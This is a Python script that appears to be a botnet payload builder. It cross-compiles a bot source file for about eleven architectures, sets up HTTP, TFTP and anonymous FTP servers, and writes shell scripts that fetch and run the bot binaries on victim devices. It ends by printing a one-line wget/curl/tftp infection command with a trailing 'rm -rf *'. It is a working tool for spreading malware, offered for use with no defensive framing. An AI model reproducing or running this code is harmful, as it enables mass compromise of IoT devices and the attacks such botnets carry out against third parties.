import subprocess, sys



if len(sys.argv[2]) != 0:

    ip = sys.argv[2]

else:

    print("\x1b[0;31mIncorrect Usage!")

    print("\x1b[0;32mUsage: python " + sys.argv[0] + " <BOTNAME.C> <IPADDR> \x1b[0m")

    exit(1)

    

bot = sys.argv[1]

get_arch = True

compileas = ["L33T", #mips

             "L33T1", #mipsel

             "L33T2", #sh4

             "L33T3", #x86

             "L33T4", #Armv6l

             "L33T5", #i686

             "L33T6", #ppc

             "L33T7", #i586

             "L33T8", #m68k

             "L33T9", #sparc

	         "L33T10"]#ppc



getarch = ['http://uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-mips.tar.bz2',
'http://uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-mipsel.tar.bz2',
'http://uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-sh4.tar.bz2',
'http://uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-x86_64.tar.bz2',
'http://distro.ibiblio.org/slitaz/sources/packages/c/cross-compiler-armv6l.tar.bz2',
'http://uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-i686.tar.bz2',
'http://uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-powerpc.tar.bz2',
'http://uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-i586.tar.bz2',
'http://uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-m68k.tar.bz2',
'http://uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-sparc.tar.bz2',
'https://uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-armv4l.tar.bz2',
'https://uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-armv5l.tar.bz2',
'https://uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-powerpc-440fp.tar.bz2']




ccs = ["cross-compiler-mips",

       "cross-compiler-mipsel",

       "cross-compiler-sh4",

       "cross-compiler-x86_64",

       "cross-compiler-armv6l",

       "cross-compiler-i686",

       "cross-compiler-powerpc",

       "cross-compiler-i586",

       "cross-compiler-m68k",

       "cross-compiler-sparc",

       "cross-compiler-powerpc-440fp"]



def run(cmd):

    subprocess.call(cmd, shell=True)



run("rm -rf /var/www/html/* /var/lib/tftpboot/* /var/ftp/*")



if get_arch == True:

    run("rm -rf cross-compiler-*")



    print("Downloading Architectures")



    for arch in getarch:

        run("wget " + arch + " --no-check-certificate >> /dev/null")

        run("tar -xvf *tar.bz2")

        run("rm -rf *tar.bz2")



    print("Cross Compilers Downloaded...")



num = 0

for cc in ccs:

    arch = cc.split("-")[2]

    run("./"+cc+"/bin/"+arch+"-gcc -static -w -pthread -D" + arch.upper() + " -o " + compileas[num] + " " + bot + " > /dev/null")

    num += 1



print("Cross Compiling Done!")

print("Setting up your httpd and tftp")



run("yum install httpd -y")

run("service httpd start")

run("yum install xinetd tftp tftp-server -y")

run("yum install vsftpd -y")

run("service vsftpd start")



run('''echo -e "# default: off

# description: The tftp server serves files using the trivial file transfer \

#       protocol.  The tftp protocol is often used to boot diskless \

#       workstations, download configuration files to network-aware printers, \

#       and to start the installation process for some operating systems.

service tftp

{

        socket_type             = dgram

        protocol                = udp

        wait                    = yes

        user                    = root

        server                  = /usr/sbin/in.tftpd

        server_args             = -s -c /var/lib/tftpboot

        disable                 = no

        per_source              = 11

        cps                     = 100 2

        flags                   = IPv4

}

" > /etc/xinetd.d/tftp''')

run("service xinetd start")



run('''echo -e "listen=YES

local_enable=NO

anonymous_enable=YES

write_enable=NO

anon_root=/var/ftp

anon_max_rate=2048000

xferlog_enable=YES

listen_address='''+ ip +'''

listen_port=21" > /etc/vsftpd/vsftpd-anon.conf''')

run("service vsftpd restart")



for i in compileas:

    run("cp " + i + " /var/www/html")

    run("cp " + i + " /var/ftp")

    run("mv " + i + " /var/lib/tftpboot/")



run('echo "#!/bin/bash" > /var/lib/tftpboot/tL33T.sh')



run('echo "ulimit -n 1024" >> /var/lib/tftpboot/tL33T.sh')



run('echo "cp /bin/busybox /tmp/" >> /var/lib/tftpboot/tL33T.sh')



run('echo "#!/bin/bash" > /var/lib/tftpboot/tL33T2.sh')



run('echo "ulimit -n 1024" >> /var/lib/tftpboot/tL33T2.sh')



run('echo "cp /bin/busybox /tmp/" >> /var/lib/tftpboot/tL33T2.sh')



run('echo "#!/bin/bash" > /var/www/html/L33T.sh')



for i in compileas:

    run('echo "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://' + ip + '/' + i + '; curl -O http://' + ip + '/' + i + '; chmod +x ' + i + '; ./' + i + '; rm -rf ' + i + '" >> /var/www/html/L33T.sh')

    run('echo "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; ftpget -v -u anonymous -p anonymous -P 21 ' + ip + ' ' + i + ' ' + i + '; chmod 777 ' + i + ' ./' + i + '; rm -rf ' + i + '" >> /var/ftp/ftp1.sh')

    run('echo "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp ' + ip + ' -c get ' + i + ';cat ' + i + ' >badbox;chmod +x *;./badbox" >> /var/lib/tftpboot/tL33T.sh')

    run('echo "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp -r ' + i + ' -g ' + ip + ';cat ' + i + ' >badbox;chmod +x *;./badbox" >> /var/lib/tftpboot/tL33T2.sh')



run("service xinetd restart")

run("service httpd restart")

run('echo -e "ulimit -n 99999" >> ~/.bashrc')



print("\x1b[0;32mSuccessfully cross compiled! by L33T\x1b[0m")

print("\x1b[0;32mYour link: cd /tmp; wget http://" + ip + "/L33T.sh; curl -O http://" + ip + "/L33T.sh; chmod 777 L33T.sh; sh L33T.sh; tftp " + ip + " -c get tL33T.sh; chmod 777 tL33T.sh; sh tL33T.sh; tftp -r tL33T2.sh -g " + ip + "; chmod 777 tL33T2.sh; sh tL33T2.sh; ftpget -v -u anonymous -p anonymous -P 21 " + ip + " ftp1.sh ftp1.sh; sh ftp1.sh; rm -rf L33T.sh tL33T.sh tL33T2.sh ftp1.sh; rm -rf *\x1b[0m")

print

print("\x1b[0;32mCoded By L33T\x1b[0m")